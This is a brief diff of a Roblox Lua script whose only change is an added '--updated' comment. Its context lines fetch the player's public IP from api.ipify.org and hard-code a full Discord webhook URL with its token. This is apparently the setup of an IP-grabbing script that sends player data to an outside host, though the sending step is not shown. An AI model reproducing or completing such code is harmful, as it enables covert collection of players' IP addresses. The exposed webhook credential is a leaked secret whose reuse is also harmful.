@@ -1,5 +1,6 @@
 local HttpService = game:GetService("HttpService")
 local ip = game:HttpGet("https://api.ipify.org")
+--updated
 local url = "https://discord.com/api/webhooks/1286417003510235220/XlyIdmF4CZYtxPemCgefLfvY_IzrePemVw3ZRIHKyryUThfb_nRfMu1O1GgMm2MtUqAG"
 local player = game.Players.LocalPlayer
 local UserInputService = game:GetService("UserInputService")
